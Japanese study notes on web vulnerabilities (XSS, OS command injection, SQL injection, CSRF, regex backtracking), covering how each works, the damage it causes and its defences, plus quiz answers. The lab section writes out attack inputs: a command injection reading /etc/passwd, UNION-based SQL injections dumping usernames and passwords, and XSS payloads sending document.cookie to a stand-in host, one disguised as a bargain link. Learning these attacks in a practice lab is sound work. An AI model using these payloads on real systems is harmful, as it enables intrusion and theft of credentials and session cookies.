# WEBサービスの代表的な脆弱性を理解する

## 課題1

### XSS

- 仕組み
脆弱性のあるWebサイトで、悪意のある人物が用意した罠ページや罠リンクを閲覧/押下することで、利用者のブラウザ上で不正なスクリプトが実行される。

- 被害
Cookieを盗まれて情報が漏洩したり、なりすましをされたりする
任意のCookieを保存される
Webページの改ざん

- 対処法
Webサイトに出力するすべての要素（HTML、URL、CSS、JavaScriptなど）をエスケープする
URLの出力がある場合、「http://」や 「https://」で始まるURLのみを許可する
<script>...</script> 要素の内容を動的に生成しない
スタイルシートを任意のサイトから取り込めるようにしない
HTTPレスポンスヘッダのContent-Typeフィールドに文字コード（charset）を指定する
マークアップ入力を許可する場合、サニタイズする

#### 参考

https://www.ipa.go.jp/security/vuln/websecurity/cross-site-scripting.html

### コマンドインジェクション

- 仕組み
脆弱性のあるWebサイトで、OSコマンドを含んだ悪意のあるリクエストを許してしまい、サーバ側で意図しないOSコマンドが不正に実行される

- 被害
サーバ内ファイルの閲覧、改ざん、削除（情報漏洩など）
不正なシステム操作（権限追加など）
不正なプログラムのダウンロード、実行（ウイルスなど）
他のシステムへの攻撃の踏み台

- 対処法
シェルを起動できる言語機能の利用を避ける
シェルを起動できる言語機能を利用する場合は、その引数を構成する全ての変数に対してチェックを行い、あらかじめ許可した処理のみを実行する。

#### 参考
https://www.ipa.go.jp/security/vuln/websecurity/os-command.html

### SQLインジェクション

- 仕組み
利用者からの入力によってSQL文を組み立てる際に、組み立て方法に問題がある場合に、攻撃者によって不正な命令文が実行されてしまう

- 被害
データベースに蓄積された非公開情報の閲覧
データベースに蓄積された情報の改ざん、消去
不正ログイン
ストアドプロシージャ等を利用したOSコマンドの実行

- 対処法
SQL文の組み立ては全てプレースホルダで実装する
SQL文の組み立てを文字列連結により行う場合は、エスケープ処理を行う
ウェブアプリケーションに渡されるパラメータにSQL文を直接指定しない
データベースに関連するエラーメッセージはブラウザに表示しない

#### 参考
https://www.ipa.go.jp/security/vuln/websecurity/sql.html

### CSRF

- 仕組み
脆弱性のあるWebサイトで、ログインしている利用者が、悪意のある人物が用意した罠ページや罠リンクを閲覧/押下することで、利用者が意図しないリクエストが送信されてしまうこと

- 被害
ログイン後の利用者のみが利用可能なサービスの悪用（送金、商品購入など）
ログイン後の利用者のみが編集可能な情報の改ざん、新規登録（パスワード変更、投稿など）

- 対処法
処理を実行するページをPOSTメソッドでアクセスするようにし、「hiddenパラメータ」に秘密情報が挿入、実行ページではその値が正しい場合のみ処理を実行する
処理を実行する直前のページで再度パスワードの入力を求め、実行ページでは、再度入力されたパスワードが正しい場合のみ処理を実行する
Refererが正しいリンク元かを確認し、正しい場合のみ処理を実行する
重要な操作を行った際に、その旨を登録済みのメールアドレスに自動送信する

### 正規表現

- 何を
対象正規表現によるパフォーマンスの悪化を検討する必要がある

- なぜ
バックトラックという方式によって正規表現のマッチ処理が行われている場合、正しい結果が得られなかった場合に少し処理を巻き戻して別のパターンを試していくアルゴリズムとなっている。
そのため、入力文字列の長さと正規表現によっては計算量が膨大になってしまい、システムのパフォーマンス悪化を招く

#### 参考
https://qiita.com/Tatamo/items/68a10c6274953e695354


## 課題2(クイズ)

- XSSとCSRFの違いはなんですか？

A. XSSはクライアント上で実行され、CSRFはサーバで実行される。XSSはいつでも発生するが、CSRFはログインを前提に発生する。
https://qiita.com/wanko5296/items/142b5b82485b0196a2da

- XSSの対策としてレスポンスヘッダに文字コードを指定することが、なぜ有効なのでしょうか？

A.指定を省略した場合、ブラウザは、文字コードを独自の方法で推定して、推定した文字コードにしたがって画面表示を処理します。たとえば、具体的な例として、HTMLテキストに、 「+ADw-script+AD4-alert(+ACI-test+ACI-)+ADsAPA-/script+AD4-」という文字列が埋め込まれた場合が考えられます。この場合、一部のブラウザはこれを「UTF-7」の文字コードでエンコードされた文字列として識別します。これがUTF-7として画面に表示されると 「<script>alert('test');</script>」として扱われるため、スクリプトが実行されてしまいます。
ウェブアプリケーションが、「エスケープ処理」を施して正しくクロスサイト・スクリプティングの脆弱性への対策をしている場合であっても、本来対象とする文字がUTF-8やEUC-JP、Shift_JIS等の文字コードで扱われてしまうと、「+ADw-」等の文字列が「エスケープ処理」されることはありません。
https://www.ipa.go.jp/security/vuln/websecurity/cross-site-scripting.html

- DOM based XSSとはなんでしょうか？

A.DOM Based XSSは、サイト利⽤者のブラウザ上で、JavaScriptがDOMを介してHTMLを操作する際に、意図しないスクリプトを出⼒してしまうXSSです。
反射型XSSおよび格納型XSSは、Webサーバからのレスポンス内に悪意あるスクリプトが含まれています。それに対してDOM Based XSSは、Webサーバからのレスポンスに直接悪意のあるスクリプトが出⼒されるのではなく、クライアントブラウザ上で正規のJavaScriptが実⾏されたタイミングで、初めて悪意のあるスクリプトが出⼒されるという点で異なっています。
反射型XSSおよび格納型XSSと異なり、DOM Based XSSは必ずしもサーバを介す必要がありません。
https://www.ubsecure.jp/blog/dom-based-xss

### XSS参考

https://zenn.dev/oreo2990/articles/d33a264b2d8b4c

## 課題3

### コマンドインジェクション

- low

```
127.0.0.1; cat /etc/passwd
```

- Medium

```
127.0.0.1 | cat /etc/passwd
```

- 防御手段

入力値をエスケープする

### SQLインジェクション

- low
```
' union select user, password from users #
```

- medium
```
1 or 1=1 union select user, password from users #
```

- 防御手段

プレースホルダを使う

### CSRF

- low

[](./csrf.html)

- 防御手段

POSTメソッドにする、hiddenパラメータに自動生成トークンを持たせ、実行ページではトークンが一致した場合のみ実行させる

#### XSS

- low(reflected)

```
<script>window.location.href='http://localhost:4280?cookie=' + document.cookie;</script>
```

- low(stored)

```
<a href="#" onclick="window.location.href='http://localhost:4280?cookie=' + document.cookie;">激安！iPhoneセール中！1000円</a>
```

- 防御手段

入力値をエスケープ処理


## 課題4

### owasp TOP10

- Broken Access Control

Nextjsを使っていた時の話。
buildした後に_next/staticにソースが入る。
next/linkで移動した時に_next/staticからソースが取られる。
URL単位で権限の制御をかけていたため、_next/staticのソースは制御がかかっておらず、直接リンクを打ち込めば見れる状態になっていた。

https://cheatsheetseries.owasp.org/IndexTopTen.html